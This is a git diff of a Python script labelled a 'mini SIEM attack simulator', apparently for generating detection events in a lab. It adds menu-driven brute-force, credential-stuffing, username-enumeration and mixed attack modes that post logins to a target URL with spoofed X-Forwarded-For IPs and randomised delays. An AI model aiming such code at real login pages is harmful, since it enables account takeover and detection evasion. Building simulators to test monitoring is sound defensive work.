@@ -37,13 +37,7 @@ passwords = [
     "wrongpass"
 ]
 
-attempt = 1
-
-while True:
-
-    username = generate_username()
-    password = random.choice(passwords)
-    ip = generate_random_ip()
+def send_request(username, password, ip):
 
     response = requests.post(
         TARGET_URL,
@@ -53,26 +47,151 @@ while True:
         },
         headers={
             "X-Forwarded-For": ip
-        }
+        },
+        proxies={
+        "http": None,
+        "https": None
+    }
     )
 
     print(
-        f"[{attempt}] "
-        f"IP={ip} "
-        f"USER={username} "
-        f"PASS={password}"
+        f"IP={ip} | USER={username} | PASS={password}"
     )
 
-    if "Login Successful" in response.text:
+    return response
 
-        print("\nSUCCESS LOGIN FOUND")
-        print(f"Username: {username}")
-        print(f"Password: {password}")
+def brute_force():
+
+    print("\n=== BRUTE FORCE MODE ===\n")
+
+    ip = generate_random_ip()
+
+    while True:
+
+        username = "admin"
+        password = random.choice(passwords)
+
+        response = send_request(
+            username,
+            password,
+            ip
+        )
+
+        if "Login Successful" in response.text:
+
+            print("\nSUCCESS LOGIN")
+            break
+
+        time.sleep(random.uniform(0.5, 2))
+
+def credential_stuffing():
+
+    print("\n=== CREDENTIAL STUFFING MODE ===\n")
+
+    username = "admin"
+
+    while True:
+
+        ip = generate_random_ip()
+
+        password = random.choice(passwords)
+
+        response = send_request(
+            username,
+            password,
+            ip
+        )
+
+        if "Login Successful" in response.text:
+
+            print("\nSUCCESS LOGIN")
+            break
+
+        time.sleep(random.uniform(0.5, 2))
+
+def username_enumeration():
+
+    print("\n=== USERNAME ENUMERATION MODE ===\n")
+
+    ip = generate_random_ip()
+
+    while True:
+
+        username = generate_username()
+
+        response = send_request(
+            username,
+            "wrongpassword",
+            ip
+        )
+
+        if "Login Successful" in response.text:
+
+            print("\nSUCCESS LOGIN")
+            break
+
+        time.sleep(random.uniform(0.5, 2))
+
+def mixed_attack():
+
+    print("\n=== MIXED ATTACK MODE ===\n")
+
+    while True:
+
+        ip = generate_random_ip()
+
+        username = generate_username()
+
+        password = random.choice(passwords)
+
+        response = send_request(
+            username,
+            password,
+            ip
+        )
+
+        if "Login Successful" in response.text:
+
+            print("\nSUCCESS LOGIN")
+            break
+
+        time.sleep(random.uniform(0.5, 2))
+
+while True:
+
+    print("\n==============================")
+    print(" MINI SIEM ATTACK SIMULATOR ")
+    print("==============================")
+    print("1. Brute Force")
+    print("2. Credential Stuffing")
+    print("3. Username Enumeration")
+    print("4. Mixed Attack")
+    print("5. Exit")
+
+    choice = input("\nSelect attack mode: ")
+
+    if choice == "1":
+
+        brute_force()
+
+    elif choice == "2":
+
+        credential_stuffing()
+
+    elif choice == "3":
+
+        username_enumeration()
+
+    elif choice == "4":
+
+        mixed_attack()
+
+    elif choice == "5":
+
+        print("Goodbye!")
 
         break
 
-    attempt += 1
+    else:
 
-    time.sleep(
-        random.uniform(0.5, 2)
-    )
+        print("Invalid Choice")
